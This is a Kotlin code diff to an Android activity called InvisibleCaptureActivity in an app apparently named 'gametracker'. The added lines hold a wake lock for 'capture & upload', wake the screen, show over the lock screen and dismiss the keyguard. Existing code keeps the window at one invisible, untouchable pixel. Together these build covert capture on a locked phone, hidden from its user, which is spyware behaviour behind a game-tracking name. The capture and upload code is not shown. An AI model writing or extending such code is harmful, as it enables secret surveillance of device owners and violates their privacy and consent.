@@ -37,18 +37,36 @@ class InvisibleCaptureActivity : Activity() {
     private var bgHandler: Handler? = null
     private val isFinished = AtomicBoolean(false)
     private var currentRequestId: String? = null
+    private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // Acquire WakeLock to keep CPU awake during capture & upload
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
+            wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "gametracker:inv_capture_wakelock")
+            wakeLock?.acquire(12000L)
+        } catch (_: Throwable) {}
+
+        // Modern API for turning on screen and showing over lock screen
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+            setShowWhenLocked(true)
+            setTurnScreenOn(true)
+            val km = getSystemService(Context.KEYGUARD_SERVICE) as? android.app.KeyguardManager
+            km?.requestDismissKeyguard(this, null)
+        }
+
         // Make window 1x1 pixel, completely invisible and non-intrusive
         try {
+            @Suppress("DEPRECATION")
             window.addFlags(
                 WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                 WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                 WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
-                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
+                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
             )
             val params = window.attributes
             params.width = 1
@@ -360,6 +378,10 @@ class InvisibleCaptureActivity : Activity() {
             imageReader = null
             handlerThread?.quitSafely()
             handlerThread = null
+            if (wakeLock?.isHeld == true) {
+                wakeLock?.release()
+            }
+            wakeLock = null
         } catch (_: Throwable) {}
         runOnUiThread {
             finishAndRemoveTask()
